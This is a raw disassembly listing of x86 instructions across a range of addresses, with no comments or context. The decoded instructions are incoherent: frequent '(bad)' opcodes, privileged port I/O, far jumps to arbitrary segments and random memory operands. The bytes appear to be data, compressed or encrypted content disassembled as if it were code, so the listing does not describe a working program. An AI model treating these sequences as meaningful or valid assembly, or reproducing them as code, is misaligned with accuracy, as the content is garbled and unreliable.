  42fe46:	add    DWORD PTR [eax],eax
  42fe48:	test   BYTE PTR [eax],0x0
  42fe4b:	add    BYTE PTR [esi],bl
  42fe4d:	add    ecx,ebp
  42fe4f:	mul    BYTE PTR [edx+0xc]
  42fe52:	shl    BYTE PTR [ecx-0x13aa7f3f],cl
  42fe58:	mov    WORD PTR ds:0xb1690b83,es
  42fe5e:	sahf   
  42fe5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe60:	(bad)  
  42fe61:	ficom  DWORD PTR [ebp+0x29]
  42fe64:	sbb    DWORD PTR [ecx+0x15],esp
  42fe67:	sub    DWORD PTR [edx+0x45],esi
  42fe6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fe6b:	imul   cl
  42fe6d:	pop    ss
  42fe6e:	scas   eax,DWORD PTR es:[edi]
  42fe6f:	inc    esp
  42fe70:	pop    DWORD PTR [edi-0x57d3088a]
  42fe76:	pop    esi
  42fe77:	or     al,0x93
  42fe79:	dec    ecx
  42fe7a:	lods   eax,DWORD PTR ds:[esi]
  42fe7b:	pop    edi
  42fe7c:	pop    ebp
  42fe7d:	cmp    al,0xd2
  42fe7f:	xchg   ecx,eax
  42fe80:	leave  
  42fe81:	inc    esi
  42fe82:	mov    ebx,0x87f83a06
  42fe87:	jle    0x42ff01
  42fe89:	dec    ebp
  42fe8a:	mov    ah,0x6c
  42fe8c:	dec    ecx
  42fe8d:	push   ds
  42fe8e:	outs   dx,BYTE PTR ds:[esi]
  42fe8f:	add    al,0xcc
  42fe91:	call   0xfc815da5
  42fe96:	nop
  42fe97:	(bad)  
  42fe98:	adc    eax,0x58f8f51e
  42fe9d:	xchg   BYTE PTR ds:0xe5829635,ch
  42fea3:	pop    edi
  42fea4:	js     0x42feda
  42fea6:	add    cl,0x8c
  42fea9:	mov    eax,ds:0x6d7f5bb5
  42feae:	jl     0x42fe49
  42feb0:	or     al,0x9c
  42feb2:	lods   eax,DWORD PTR ds:[esi]
  42feb3:	adc    al,0x62
  42feb5:	xor    eax,0xb1c6e866
  42feba:	mul    DWORD PTR [ebx+0x5b]
  42febd:	outs   dx,DWORD PTR ds:[esi]
  42febe:	mov    ah,0xf8
  42fec0:	ins    BYTE PTR es:[edi],dx
  42fec1:	sbb    eax,0x8014ae01
  42fec6:	or     dh,dh
  42fec8:	cmp    BYTE PTR [edx],ch
  42feca:	jae    0x42fe8f
  42fecc:	dec    ebx
  42fecd:	fld    QWORD PTR [ecx]
  42fecf:	lock fadd DWORD PTR [ebp-0xc]
  42fed3:	(bad)  
  42fed4:	inc    BYTE PTR [esi+0x8]
  42fed7:	out    dx,al
  42fed8:	mov    ds:0x92b63fed,al
  42fedd:	sub    dl,dl
  42fedf:	cli    
  42fee0:	lods   al,BYTE PTR ds:[esi]
  42fee1:	pop    ss
  42fee2:	in     eax,dx
  42fee3:	mov    eax,0x43aa0c02
  42fee8:	xor    edi,edi
  42feea:	shl    DWORD PTR [ebp+0x41],0xbb
  42feee:	adc    eax,0xde4dffc1
  42fef3:	push   edx
  42fef4:	xor    BYTE PTR [edi+0x24],al
  42fef7:	sbb    bl,al
  42fef9:	(bad)  
  42fefa:	loop   0x42ff4c
  42fefc:	loopne 0x42ff75
  42fefe:	retf   
  42feff:	lahf   
  42ff00:	mov    dh,0xe5
  42ff02:	push   esp
  42ff03:	mov    al,0xb7
  42ff05:	sbb    eax,0x6e53abc
  42ff0a:	mov    esi,0xe3d9b6f5
  42ff0f:	mov    edx,0x65212120
  42ff14:	adc    ebp,ebx
  42ff16:	add    eax,0x3ca93e43
  42ff1b:	xor    ecx,DWORD PTR [eax+0x3b217f4e]
  42ff21:	dec    eax
  42ff22:	mov    ds:0xe0e293ca,al
  42ff27:	mov    al,ds:0xc0add1d2
  42ff2c:	and    eax,0x609b5318
  42ff31:	pop    edx
  42ff32:	xor    BYTE PTR [eax-0x7d504a67],dl
  42ff38:	pop    es
  42ff39:	fs sub eax,0x34be530a
  42ff3f:	cmp    BYTE PTR [edx],al
  42ff41:	sub    DWORD PTR [eax],eax
	...
  42ffb3:	add    BYTE PTR [edx],dl
  42ffb5:	ds int 0xe5
  42ffb8:	in     eax,dx
  42ffb9:	idiv   DWORD PTR [edx]
  42ffbb:	push   DWORD PTR [ebx+0x34897fea]
  42ffc1:	and    ch,bh
  42ffc3:	repnz inc edx
  42ffc5:	sti    
  42ffc6:	add    DWORD PTR [eax],eax
  42ffc8:	test   BYTE PTR [eax],0x0
  42ffcb:	add    BYTE PTR [ecx],ch
  42ffcd:	loop   0x42ffa0
  42ffcf:	or     BYTE PTR [ebx],dl
  42ffd1:	cli    
  42ffd2:	xor    al,BYTE PTR [ecx+esi*2]
  42ffd5:	div    BYTE PTR [ebp+0x62]
  42ffd8:	ins    DWORD PTR es:[edi],dx
  42ffd9:	cmp    al,0xb1
  42ffdb:	int    0x2a
  42ffdd:	lds    ebx,FWORD PTR [esp+ecx*4-0x5a20e406]
  42ffe4:	es sbb al,0xa1
  42ffe7:	add    eax,0x4cdd3409
  42ffec:	xlat   BYTE PTR ds:[ebx]
  42ffed:	jno    0x42ff93
  42ffef:	add    DWORD PTR [edi],0xafa3eff5
  42fff5:	ds inc edx
  42fff7:	push   esp
  42fff8:	sar    BYTE PTR [ebp-0x3d0c5147],cl
  42fffe:	inc    ebx
  42ffff:	jl     0x430060
  430001:	dec    edi
  430002:	dec    edx
  430003:	xchg   esi,eax
  430004:	adc    BYTE PTR [edx],bh
  430006:	mov    esi,0xee94d9ea
  43000b:	fstp   DWORD PTR [edi]
  43000d:	sbb    DWORD PTR [ecx+0x2a],esi
  430010:	xor    al,0x8b
  430012:	into   
  430013:	inc    ebp
  430014:	test   BYTE PTR [edi],bh
  430016:	cli    
  430017:	loop   0x430041
  430019:	addr16 mov bh,0xfb
  43001c:	jmp    0x3c2c7f65
  430021:	pop    DWORD PTR [edx-0x379b8f12]
  430027:	popf   
  430028:	mov    edx,0x99951d88
  43002d:	into   
  43002e:	fstp   QWORD PTR [eax-0x26]
  430031:	aaa    
  430032:	std    
  430033:	sub    BYTE PTR [edi],bl
  430035:	ret    
  430036:	mov    eax,ds:0xcd6a666d
  43003b:	dec    esi
  43003c:	mov    BYTE PTR [eax-0x4e],al
  43003f:	bound  eax,QWORD PTR [edx-0x74a65ad2]
  430045:	das    
  430046:	fisub  DWORD PTR [eax]
  430048:	lock mov eax,ds:0xe0ab3111
  43004e:	cli    
  43004f:	pop    edi
  430050:	test   ecx,ebx
  430052:	push   ecx
  430053:	stos   BYTE PTR es:[edi],al
  430054:	lock pop eax
  430056:	fmulp  st(2),st
  430058:	addr16 enter 0x809c,0xb5
  43005d:	in     eax,0x66
  43005f:	aad    0x3d
  430061:	push   edi
  430062:	inc    ebx
  430063:	(bad)  
  430064:	rcl    BYTE PTR [ebx+0x282304e4],1
  43006a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43006b:	or     al,0x2c
  43006d:	sbb    edx,edx
  43006f:	xor    esp,eax
  430071:	fstp   TBYTE PTR ds:0x221d2482
  430077:	ds jnp 0x430078
  43007a:	dec    ebp
  43007b:	mov    esi,0x56756762
  430080:	repz jl 0x430084
  430083:	ja     0x430043
  430085:	iret   
  430086:	mov    ebx,DWORD PTR [esi+0x2ed4da55]
  43008c:	mov    dh,0x54
  43008e:	cmp    DWORD PTR [ebx-0x344e5fd4],eax
  430094:	in     al,0x2f
  430096:	mov    ds:0xda99ee8c,eax
  43009b:	jmp    0x7d2b:0x1102062d
  4300a2:	stos   BYTE PTR es:[edi],al
  4300a3:	sbb    ebp,ebx
  4300a5:	sub    al,0x20
  4300a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4300a8:	and    BYTE PTR [edi],dh
  4300aa:	popa   
  4300ab:	ror    DWORD PTR [eax+0x40],cl
  4300ae:	fcomp  DWORD PTR [edx+0x49]
  4300b1:	cwde   
  4300b2:	stc    
  4300b3:	shl    DWORD PTR [edx],1
  4300b5:	scas   al,BYTE PTR es:[edi]
  4300b6:	cdq    
  4300b7:	lock or DWORD PTR gs:[ebp-0x75831c64],ecx
  4300bf:	out    dx,al
  4300c0:	mov    ebp,0x23
	...
  430131:	add    BYTE PTR [eax],al
  430133:	add    BYTE PTR [edx+0x26],bl
  430136:	jecxz  0x43017b
  430138:	inc    edi
  43013a:	cli    
  43013b:	aas    
  43013c:	push   edi
  43013d:	jmp    0x5496:0x1497a608
  430144:	cmp    ah,bh
  430146:	add    DWORD PTR [eax],eax
  430148:	test   BYTE PTR [eax],0x0
  43014b:	add    BYTE PTR [esi-0x47],ch
  43014e:	(bad)  
  43014f:	jbe    0x43015d
  430151:	inc    ebp
  430152:	add    cl,BYTE PTR [edx+0x20]
  430155:	in     al,0x8a
  430157:	ffreep st(4)
  430159:	ja     0x4301ce
  43015b:	fld    DWORD PTR [eax-0x6f]
  43015e:	sbb    al,0xa5
  430160:	icebp  
  430161:	mov    ebx,0x93d6f727
  430166:	inc    edx
  430167:	stos   BYTE PTR es:[edi],al
  430168:	inc    esi
  430169:	pop    ss
  43016a:	jae    0x43016d
  43016c:	lock std 
  43016e:	enter  0x672f,0x8
  430172:	add    dh,dl
  430174:	xor    BYTE PTR [eax],ah
  430176:	aad    0x3
  430178:	sbb    eax,0xb5fa929
  43017d:	jno    0x430142
  43017f:	jnp    0x430104
  430181:	js     0x43019c
  430183:	adc    ebx,ecx
  430185:	pop    ebp
  430186:	jle    0x4301bb
  430188:	jne    0x430185
  43018a:	adc    dh,BYTE PTR [ebx]
  43018c:	mov    DWORD PTR [edi],ebp
  43018e:	sbb    eax,0x7a4344d0
  430193:	xchg   BYTE PTR [edi],al
  430195:	popa   
  430196:	jg     0x43013c
  430198:	nop
  430199:	mov    dl,0x6f
  43019b:	jnp    0x4301d3
  43019d:	adc    eax,DWORD PTR [edi]
  43019f:	add    BYTE PTR [ecx+0x71],cl
  4301a2:	mov    al,0x82
  4301a4:	sti    
  4301a5:	loope  0x4301f1
  4301a7:	pop    esp
  4301a8:	rcr    dl,1
  4301aa:	mov    dl,0x9b
  4301ac:	sbb    al,0x4f
  4301ae:	(bad)  
  4301af:	pop    ebx
  4301b0:	cmp    DWORD PTR [esi+0x75],esp
  4301b3:	adc    al,0x60
  4301b5:	pop    edi
  4301b6:	pop    es
  4301b7:	push   edx
  4301b8:	jl     0x430227
  4301ba:	dec    eax
  4301bb:	lods   al,BYTE PTR ds:[esi]
  4301bc:	inc    edx
  4301bd:	push   0x17e51532
  4301c2:	mov    eax,ds:0xb05da6cd
  4301c7:	iret   
  4301c8:	dec    edi
  4301c9:	in     eax,0x3c
  4301cb:	or     DWORD PTR [eax],edx
  4301cd:	pop    edx
  4301ce:	test   ecx,eax
  4301d0:	push   ebp
  4301d1:	(bad)  
  4301d2:	mov    esi,0x7367cbd3
  4301d7:	add    al,0xd7
  4301d9:	jg     0x430207
  4301db:	data16 jno 0x4301f0
  4301de:	lahf   
  4301df:	out    0xce,eax
  4301e1:	mul    BYTE PTR [edx-0x46f18139]
  4301e7:	xlat   BYTE PTR ds:[bx]
  4301e9:	(bad)  
  4301eb:	in     eax,0x15
  4301ed:	inc    eax
  4301ee:	(bad)  
  4301ef:	and    eax,0xb769caf6
  4301f4:	mov    WORD PTR [esi],gs
  4301f6:	data16 mov ah,0x3b
  4301f9:	adc    eax,0xb7a6f38a
  4301fe:	std    
  4301ff:	jmp    0xa2b1:0xe057a7bd
  430206:	lahf   
  430207:	cmp    eax,0xed18da75
  43020c:	mov    dh,0x54
  43020e:	leave  
  43020f:	push   edx
  430210:	cmp    BYTE PTR [ebp-0x3938a94a],bl
  430216:	pop    eax
  430217:	(bad)
  43021a:	adc    eax,0x2eb0a87d
  43021f:	(bad)  [edi-0x16]
  430222:	div    BYTE PTR [edi+0x2db60ece]
  430228:	jae    0x4301be
  43022a:	mov    ds:0x7bfd6264,eax
  43022f:	stc    
  430230:	cmp    BYTE PTR [edx+0x14],bl
  430233:	ja     0x43022e
  430235:	mov    dl,0x2f
  430237:	(bad)  
  430238:	std    
  430239:	sbb    al,0xe5
  43023b:	cdq    
  43023c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43023d:	push   ebp
  43023e:	loope  0x430229
  430240:	arpl   WORD PTR [eax+eax*1+0x0],bx
	...
  4302b3:	add    BYTE PTR [ebp-0x5075f7e6],bh
  4302b9:	call   0x7040:0xea3a3fbf
  4302c0:	mov    eax,0x2ed72b92
  4302c5:	std    
  4302c6:	add    DWORD PTR [eax],eax
  4302c8:	test   BYTE PTR [eax],0x0
  4302cb:	add    BYTE PTR [edx+0x2bf84400],cl
  4302d1:	mov    cl,0x26
  4302d3:	cmp    ebp,DWORD PTR [eax+0x2b]
  4302d6:	and    BYTE PTR [esi-0x43ec2d2e],ah
  4302dc:	add    DWORD PTR [ebx],ebp
  4302de:	and    DWORD PTR [ecx],ebp
  4302e0:	adc    eax,0x54dd5f03
  4302e5:	in     al,dx
  4302e6:	in     al,dx
  4302e7:	add    BYTE PTR [edi+0x151f0ac],bh
  4302ed:	aam    0xf2
  4302ef:	lock xchg ebx,eax
  4302f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4302f2:	sti    
  4302f3:	dec    esp
  4302f4:	test   eax,0x7db91e94
  4302f9:	jmp    0x35b5369d
  4302fe:	in     al,0x56
  430300:	(bad)  
  430302:	xchg   edx,eax
  430303:	fwait
  430304:	push   esi
  430305:	rcr    DWORD PTR [ebp+0x6f6b032d],0xd2
  43030c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43030d:	push   eax
  43030e:	add    eax,0xfc2a2a93
  430313:	inc    eax
  430314:	add    dl,BYTE PTR [ebp+ebp*4+0x51]
  430318:	mov    esp,0x2ef12a19
  43031d:	out    0x79,eax
  43031f:	and    BYTE PTR [ebx+0xb],ah
  430322:	add    al,0x2c
  430324:	cmc    
  430325:	add    esp,DWORD PTR [edi-0x6c75019]
  43032b:	mov    ds:0x21d1afe9,eax
  430330:	ficom  WORD PTR [ecx+edx*2]
  430333:	sub    al,0xa1
  430335:	arpl   dx,bx
  430337:	push   esp
  430338:	cs ret 0x2f5e
  43033c:	loop   0x43037f
  43033e:	jno    0x430322
  430340:	cmp    al,0x4f
  430342:	mov    ds:0x8e185915,al
  430347:	cmp    edi,edi
  430349:	(bad)  
  43034a:	sbb    ch,BYTE PTR ss:[edx]
  43034d:	inc    ecx
  43034e:	stos   DWORD PTR es:[edi],eax
  43034f:	jge    0x4302f2
  430351:	in     eax,dx
  430352:	pop    ebx
  430353:	xor    eax,DWORD PTR [edi]
  430355:	je     0x430312
  430357:	inc    ecx
  430358:	mov    bh,0x6c
  43035a:	mov    ah,0xfb
  43035c:	add    eax,0xc40a06dd
  430361:	sti    
  430362:	in     al,dx
  430363:	pop    ebx
  430364:	pcmpeqb mm7,QWORD PTR [ecx-0xa]
  430368:	pop    eax
  430369:	mov    esi,edi
  43036b:	call   0x468b1d47
  430370:	lahf   
  430371:	popf   
  430372:	cli    
  430373:	lock enter 0x2e1c,0x80
  430378:	outs   dx,DWORD PTR ds:[esi]
  430379:	cdq    
  43037a:	not    eax
  43037c:	ret    
  43037d:	pop    esp
  43037e:	add    ecx,DWORD PTR [eax+0x34ce93a9]
  430384:	dec    di
  430386:	or     DWORD PTR [edi+ecx*4-0x7e],edi
  43038a:	shl    al,cl
  43038c:	xor    bl,BYTE PTR [ebx]
  43038e:	ins    BYTE PTR es:[edi],dx
  43038f:	xor    eax,0x9e8b3cc
  430394:	je     0x43037e
  430396:	pop    ss
  430397:	push   ds
  430398:	pop    edi
  430399:	into   
  43039a:	sub    cl,ch
  43039c:	mov    dh,0x70
  43039e:	inc    esp
  43039f:	cmp    cl,0x65
  4303a2:	loopne 0x4303f9
  4303a4:	adc    al,0x4f
  4303a6:	rcr    BYTE PTR [ebx],1
  4303a8:	fcmovu st,st(0)
  4303aa:	out    dx,eax
  4303ab:	ja     0x4303eb
  4303ad:	gs call 0xbd612547
  4303b3:	pop    eax
  4303b4:	push   0xffffffa8
  4303b6:	or     BYTE PTR ds:0x8b4f13f1,cl
  4303bc:	xor    BYTE PTR [edi],dh
  4303be:	and    BYTE PTR [edx+0x6dd8],dh
	...
  430434:	aaa    
  430435:	jae    0x430481
  430437:	cdq    
  430438:	dec    esi
  430439:	mov    ecx,0x802fff7
  43043e:	fs jmp 0xfe24:0x2248cb36
  430446:	add    DWORD PTR [eax],eax
  430448:	test   BYTE PTR [eax],0x0
  43044b:	add    BYTE PTR [ecx+0x4],ah
  43044e:	xchg   edx,eax
  43044f:	pop    eax
  430450:	fwait
  430451:	jne    0x43044e
  430453:	std    
  430454:	jp     0x4303f6
  430456:	cmp    DWORD PTR [ebp+0x50],eax
  430459:	les    ebp,FWORD PTR [eax]
  43045b:	cwde   
  43045c:	stos   BYTE PTR es:[edi],al
  43045d:	dec    esi
  43045e:	lahf   
  43045f:	xchg   esp,edx
  430461:	pop    eax
  430462:	pushf  
  430463:	lods   eax,DWORD PTR ds:[esi]
  430464:	inc    edi
  430465:	out    dx,al
  430466:	daa    
  430467:	test   al,0xb9
  430469:	dec    edi
  43046a:	repz jno 0x43044e
  43046d:	mov    ah,0xd7
  43046f:	aaa    
  430470:	and    al,0x99
  430472:	mov    cs,WORD PTR [ebp*2-0x3e907e31]
  430479:	add    al,0x9f
  43047b:	dec    ebx
  43047c:	imul   edx,DWORD PTR [ebx+0x18],0xffffff9c
  430480:	jns    0x430402
  430482:	repz cli 
  430484:	fs loope 0x43049e
  430487:	lods   al,BYTE PTR ds:[esi]
  430488:	test   eax,0x1b0d3fde
  43048d:	mov    esp,0xd4e150be
  430492:	xlat   BYTE PTR ds:[ebx]
  430493:	push   ss
  430494:	pop    ds
  430495:	mov    al,0xdb
  430497:	add    al,0x80
  430499:	js     0x430479
  43049b:	sub    edx,DWORD PTR [esi]
  43049d:	fnstsw WORD PTR ds:0x984e4701
  4304a3:	push   esp
  4304a4:	loop   0x430504
  4304a6:	gs nop
  4304a8:	aas    
  4304a9:	pop    ebp
  4304aa:	fsub   QWORD PTR [eax+ecx*1-0x30]
  4304ae:	jge    0x430492
  4304b0:	xor    dh,BYTE PTR [ecx+0x18df0e64]
  4304b6:	ja     0x4304e1
  4304b8:	or     al,0x74
  4304ba:	mov    dl,0xf9
  4304bc:	adc    DWORD PTR [edx],edx
  4304be:	shr    dh,0x76
  4304c1:	cdq    
  4304c2:	je     0x430495
  4304c4:	xor    al,0xce
  4304c6:	cwde   
  4304c7:	fwait
  4304c8:	adc    eax,0x5ef1f9d
  4304cd:	or     DWORD PTR [edi],0xbb46e070
  4304d3:	les    ebp,FWORD PTR [edx+0x7915cc3d]
  4304d9:	xchg   ebx,eax
  4304da:	mov    ebp,0x6f46a3e1
  4304df:	sub    DWORD PTR [edx-0x13e42ad5],ebp
  4304e5:	clc    
  4304e6:	jae    0x4304fd
  4304e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304e9:	mov    al,ds:0x488729de
  4304ee:	ins    BYTE PTR es:[edi],dx
  4304ef:	or     DWORD PTR [eax+0x27136fa5],edi
  4304f5:	or     bh,bh
  4304f7:	cmp    al,0x7f
  4304f9:	xlat   BYTE PTR ds:[ebx]
  4304fa:	mov    al,ds:0x8b53264f
  4304ff:	pop    edi
  430500:	loopne 0x4304d0
  430502:	jnp    0x430567
  430504:	sbb    ebx,DWORD PTR [eax+0x2b]
  430507:	xor    eax,0x762a73f1
  43050c:	ins    BYTE PTR es:[edi],dx
  43050d:	out    0x4f,eax
  43050f:	call   0x8643:0x301f6b4c
  430516:	stc    
  430517:	lods   al,BYTE PTR ds:[esi]
  430518:	sbb    BYTE PTR [edx],bh
  43051a:	pusha  
  43051b:	sahf   
  43051c:	(bad)  
  43051d:	in     eax,dx
  43051e:	hlt    
  43051f:	aam    0x82
  430521:	fsubr  DWORD PTR [ebx-0x5f6dd902]
  430527:	les    esi,FWORD PTR [eax]
  430529:	cld    
  43052a:	retf   0x4b7b
  43052d:	leave  
  43052e:	stos   BYTE PTR es:[edi],al
  43052f:	mov    ebp,0xfc05e62
  430534:	push   edi
  430535:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430536:	fcmovnbe st,st(5)
  430538:	dec    edi
  430539:	addr16 push ebp
  43053b:	repnz mov esi,0xd30f0247
  430541:	popf   
	...
  4305b2:	add    BYTE PTR [eax],al
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x2b]
  4305c1:	mov    WORD PTR ds:0x1ff1a47,gs
  4305c7:	add    dh,dh
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [edx+0x41ef02e5],dl
  4305d1:	dec    ebp
  4305d2:	mov    esp,0x5515a04d
  4305d7:	pop    ebx
  4305d8:	fwait
  4305d9:	scas   al,BYTE PTR es:[edi]
  4305da:	fs aas 
  4305dc:	pusha  
  4305dd:	dec    esp
  4305de:	pop    edi
  4305df:	retf   
  4305e0:	adc    DWORD PTR [esi],eax
  4305e2:	pusha  
  4305e3:	add    DWORD PTR ds:0x38727777,esi
  4305e9:	rol    DWORD PTR [ebp+0x7da70da7],1
  4305ef:	dec    ebp
  4305f0:	(bad)  
  4305f1:	call   FWORD PTR [edi+edi*8-0x7b50fbd3]
  4305f8:	push   0x20
  4305fa:	mov    eax,0x23c2ead1
  4305ff:	jns    0x4305f4
  430601:	cmp    al,0xb7
  430603:	dec    edi
  430604:	(bad)
  430608:	retf   0x3ca6
  43060b:	push   edi
  43060c:	aam    0xa4
  43060e:	sbb    al,0xc0
  430610:	repz jl 0x430670
  430613:	cmp    eax,0xcc109b98
  430618:	pop    eax
  430619:	and    al,BYTE PTR [ecx+eiz*1+0x4d]
  43061d:	mov    esi,0x49a946c6
  430622:	add    eax,0x60b229a2
  430627:	in     eax,0x28
  430629:	mov    ebp,0x4b257eb
  43062e:	xchg   DWORD PTR [eax-0x48],ebp
  430631:	xor    eax,0xcc46483a
  430636:	dec    esi
  430637:	inc    ecx
  430638:	cmp    al,BYTE PTR [edi+edx*4]
  43063b:	sub    DWORD PTR [ebx+0x65],ebp
  43063e:	leave  
  43063f:	sbb    DWORD PTR [esi+0xb65f323],ecx
  430645:	sub    bh,al
  430647:	cpuid  
  430649:	fdivr  QWORD PTR [edi+0x56]
  43064c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43064d:	push   eax
  43064e:	xchg   esp,eax
  43064f:	jae    0x430682
  430651:	imul   edx,DWORD PTR [ecx],0xffffffad
  430654:	and    eax,0x9d9e703e
  430659:	push   0xffffff91
  43065b:	sub    al,0x46
  43065d:	rcr    BYTE PTR [ecx+0x5259fc94],0xcf
  430664:	jp     0x4305e8
  430666:	inc    esp
  430667:	icebp  
  430668:	mov    esi,0x25f5156a
  43066d:	fld    QWORD PTR ds:0xe02535ef
  430673:	add    eax,0x75b3ca15
  430678:	sbb    esp,DWORD PTR [edx]
  43067a:	shr    DWORD PTR [edi],cl
  43067c:	sti    
  43067d:	xor    al,0xb8
  43067f:	shr    BYTE PTR [ebp+eiz*2+0x48],1
  430683:	out    dx,eax
  430684:	loopne 0x4306d2
  430686:	xchg   edx,eax
  430687:	jecxz  0x4306eb
  430689:	in     al,0x7a
  43068b:	jnp    0x430639
  43068d:	les    ecx,FWORD PTR [edi+ecx*8+0x6f6b7fe5]
  430694:	rcl    DWORD PTR fs:[ebx],0x44
  430698:	fld    QWORD PTR [esi-0x53]
  43069b:	scas   eax,DWORD PTR es:[edi]
  43069c:	and    al,0x9c
  43069e:	sbb    al,0x73
  4306a0:	jae    0x4306d8
  4306a2:	jl     0x4306e7
  4306a4:	pop    ss
  4306a5:	xchg   esi,eax
  4306a6:	sub    bh,BYTE PTR [eax-0x71]
  4306a9:	pop    eax
  4306aa:	jmp    0xfd3e:0xec64f6e1
  4306b1:	fld    DWORD PTR [edi+0x38]
  4306b4:	outs   dx,DWORD PTR ds:[esi]
  4306b5:	or     DWORD PTR [edi+0x6eb1d272],edx
  4306bb:	imul   ebx,DWORD PTR [edi+0x3e9ea489],0x61
	...
  430732:	add    BYTE PTR [eax],al
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x6
  430741:	pop    ebp
  430742:	mov    ds:0x200103f,eax
  430747:	add    dh,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    al,dl
  43074d:	push   0x79932a19
  430752:	pop    ebp
  430753:	mov    ch,BYTE PTR [ebp-0x478798b8]
  430759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43075a:	xchg   edx,eax
  43075b:	jnp    0x43075f
  43075d:	test   eax,0x96b46878
  430762:	addr16 jae 0x4307a1
  430765:	(bad)  
  430766:	pop    sp
  430768:	pop    ecx
  430769:	test   BYTE PTR [edi+0xc50826d],dh
  43076f:	jb     0x43073f
  430771:	xchg   edi,eax
  430772:	mov    ch,0x77
  430774:	retf   0x841a
  430777:	mov    esi,0xfc683b5b
  43077c:	mov    ds:0x2021aa73,al
  430781:	xchg   DWORD PTR [ecx],edi
  430783:	in     al,dx
  430784:	imul   edi,DWORD PTR es:[edi],0xb60d2c6c
  43078b:	aas    
  43078c:	sub    cl,bh
  43078e:	sbb    eax,0xf6ad212a
  430793:	sub    ecx,ebp
  430795:	pop    ebp
  430796:	test   eax,0xf8689e81
  43079b:	hlt    
  43079c:	pop    eax
  43079d:	xchg   eax,edx
  43079f:	test   DWORD PTR [edi],eax
  4307a1:	mov    eax,ds:0xc3bea8bb
  4307a6:	shl    DWORD PTR [ebp+0x23],cl
  4307a9:	jns    0x4307c0
  4307ab:	stos   BYTE PTR es:[edi],al
  4307ac:	in     eax,dx
  4307ad:	and    BYTE PTR [ebx-0x30c4f29d],cl
  4307b3:	pop    edi
  4307b4:	int3   
  4307b5:	push   esp
  4307b6:	push   ecx
  4307b7:	sbb    DWORD PTR [eax+0x14dac9ed],esi
  4307bd:	jnp    0x4307f1
  4307bf:	xor    eax,0xc1bb40b9
  4307c4:	jmp    0xfe1b:0xbf114999
  4307cb:	mov    edx,0x4962ed3d
  4307d0:	xor    edi,DWORD PTR [ecx+0x73]
  4307d3:	inc    edi
  4307d4:	outs   dx,BYTE PTR ds:[esi]
  4307d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4307d6:	cmp    cl,cl
  4307d8:	in     al,dx
  4307d9:	(bad)  
  4307da:	adc    edx,DWORD PTR [ebp-0x5e]
  4307dd:	adc    al,0x69
  4307df:	push   ecx
  4307e0:	pushf  
  4307e1:	sahf   
  4307e2:	xor    esp,edx
  4307e4:	adc    al,0xd6
  4307e6:	ins    BYTE PTR es:[edi],dx
  4307e7:	fld    TBYTE PTR [eax+esi*2+0x35d57ecd]
  4307ee:	xchg   DWORD PTR [eax+0x5f1d1aaf],esi
  4307f4:	jge    0x430799
  4307f6:	jle    0x430805
  4307f8:	push   0x62
  4307fa:	inc    edx
  4307fb:	or     ch,dh
  4307fd:	imul   ebx,DWORD PTR [di],0x11cad1d5
  430804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430805:	add    ebx,DWORD PTR [edx-0x3f]
  430808:	fiadd  DWORD PTR [edx+0xd]
  43080b:	adc    DWORD PTR [edx],edi
  43080d:	mov    edi,0xea5fafd2
  430812:	es cmp eax,0x6c4b7e63
  430818:	add    esi,DWORD PTR [edi]
  43081a:	jbe    0x430823
  43081c:	fimul  WORD PTR [ebx]
  43081e:	int3   
  43081f:	int    0xdd
  430821:	mov    bl,0xc9
  430823:	aas    
  430824:	push   0xda4e1bff
  430829:	pop    eax
  43082a:	xor    al,0x82
  43082c:	mov    edx,0x270f3d72
  430831:	out    dx,eax
  430832:	nop
  430833:	shl    BYTE PTR [edi+0x396b6f6b],1
  430839:	hlt    
  43083a:	outs   dx,BYTE PTR ds:[esi]
  43083b:	div    al
  43083d:	or     BYTE PTR [ecx+0x9ff182],0x0
	...
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	das    
  4308c1:	sub    al,0xbf
  4308c3:	pop    ebp
  4308c4:	push   es
  4308c5:	add    DWORD PTR [edx],eax
  4308c7:	add    dh,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [ebx-0x18],ch
  4308ce:	test   eax,0x55462f4d
  4308d3:	mov    eax,0xab88f94c
  4308d8:	cli    
  4308d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4308da:	sub    al,0xd4
  4308dc:	retf   
  4308dd:	sub    BYTE PTR [eax],bh
  4308df:	repz daa 
  4308e1:	pop    ecx
  4308e2:	int3   
  4308e3:	popa   
  4308e4:	mov    ds:0x40402a64,eax
  4308e9:	inc    ecx
  4308ea:	mov    BYTE PTR [eax+0x12],bh
  4308ed:	sbb    eax,ebp
  4308ef:	sahf   
  4308f0:	sbb    bl,BYTE PTR [ecx-0x334603f9]
  4308f6:	mov    al,ds:0x72793f0b
  4308fb:	dec    ebp
  4308fc:	je     0x4308ca
  4308fe:	aaa    
  4308ff:	inc    edx
  430900:	and    ch,bh
